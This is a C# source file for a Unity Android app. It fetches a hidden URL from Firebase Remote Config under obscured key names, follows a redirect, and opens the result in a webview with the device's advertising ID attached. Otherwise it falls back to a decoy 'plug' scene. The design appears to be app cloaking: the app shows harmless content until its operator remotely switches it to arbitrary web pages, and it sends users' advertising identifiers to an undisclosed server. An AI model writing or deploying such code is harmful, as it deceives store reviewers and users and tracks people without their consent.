using System;
using System.Collections;
using System.Linq;
using System.Threading.Tasks;
using Firebase.Extensions;
using Firebase.RemoteConfig;
using Gpm.WebView;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public static class Fetcher
{
    private const string FirebaseDataIdentifier = "Data1";
    private const string FirebaseGUIDPrefixIdentifier = "Data2";
    private static FirebaseRemoteConfig RCInstance;
    private static int PlugSceneBuildIndex;
    private static WebView WebView;

    public static void DoAsync(int plugSceneInx, WebView webView)
    {
        WebView = webView;
        PlugSceneBuildIndex = plugSceneInx;
        RCInstance = FirebaseRemoteConfig.DefaultInstance;
        RCInstance.FetchAsync(TimeSpan.Zero).ContinueWithOnMainThread(ContinueFetching);
    }

    private static void ContinueFetching(Task task)
    {
        if (task.IsCanceled || task.IsFaulted)
        {
            SkipToPlug();
            return;
        }

        var configInfo = RCInstance.Info;
        
        switch (configInfo.LastFetchStatus)
        {
            case LastFetchStatus.Success:
                FirebaseRemoteConfig.DefaultInstance.ActivateAsync().ContinueWithOnMainThread(inTask =>
                {
                    var link = RCInstance.GetValue(FirebaseDataIdentifier).StringValue;
                        
                    if (string.IsNullOrEmpty(link)) 
                    {
                        SkipToPlug();
                        return;
                    }
                    
                    var prefix = RCInstance.GetValue(FirebaseGUIDPrefixIdentifier).StringValue;

                    WebView.StartCoroutine(Response(link, prefix));
                });

                break;
            case LastFetchStatus.Failure:
                if (configInfo.LastFetchFailureReason is FetchFailureReason.Error)
                {
                    SkipToPlug();
                }
                break;
        }
    }
    
    private static IEnumerator Response(string link, string prefix)
    {
        var request = UnityWebRequest.Get(link);
        try
        {
            request.SetRequestHeader("User-Agent", GetUserAgent());
        }
        catch (Exception)
        {
            SkipToPlug();
            yield break;
        }
        yield return request.SendWebRequest();
        
        var serializedData = request.downloadHandler.text;
        var resultURIIsValid = JsonUtility.FromJson<JsonAPIData>(serializedData).LocationIsValid(out var resultURI);

        if (!resultURIIsValid)
        {
            SkipToPlug();
            yield break;
        }
        
        if (string.IsNullOrEmpty(prefix))
        {
            WebView.Run(resultURI);
            yield break;
        }
        
        if (AdvertiserIdentifierIsValid(out var id))
        {
            WebView.Run(CombineUri(resultURI, prefix + id));
        }
        else
        {
            SkipToPlug();
        }
    }

    [Serializable]
    private struct JsonAPIData
    {
        [SerializeField]
        private string[] headers;

        public bool LocationIsValid(out string resultURI)
        {
            resultURI = string.Empty;
            
            if (headers is null || headers.Length is 0)
            {
                return false;
            }
            
            resultURI = headers.First().Remove(0, 10);
            return true;
        }
    }
    
    private static string CombineUri(string start, string end)
    {
        return $"{start.TrimEnd('/')}/{end.TrimStart('/')}";
    }

    private static bool AdvertiserIdentifierIsValid(out string id)
    {
        const string playerPath = "com.unity3d.player.UnityPlayer";
        const string activityName = "currentActivity";
        const string clientPath = "com.google.android.gms.ads.identifier.AdvertisingIdClient";
        const string identifierInfoFetcher = "getAdvertisingIdInfo";
        const string identifierFetcher = "getId";
        
        id = string.Empty;
        
        try
        {
            var root = new AndroidJavaClass (playerPath);
            var currentActivity = root.GetStatic<AndroidJavaObject> (activityName);
            var client = new AndroidJavaClass (clientPath);
            var adInfo = client.CallStatic<AndroidJavaObject> (identifierInfoFetcher, currentActivity);
    
            id = adInfo.Call<string> (identifierFetcher);
            return true;
        }
        catch
        {
            return false;
        }
    }
    
    private static string GetUserAgent()
    {
        const string systemClassPath = "java.lang.System";
        const string stringClassPath = "java.lang.String";
        const string propertyGetter = "getProperty";
        const string userAgentParameter = "http.agent";
        
        var propertyParameter = new AndroidJavaObject(stringClassPath, userAgentParameter);
        return new AndroidJavaClass(systemClassPath).CallStatic<string>(propertyGetter, propertyParameter);
    }

    public static void SkipToPlug()
    {
        GpmWebView.Close();
        SceneManager.LoadScene(PlugSceneBuildIndex);
    }
}
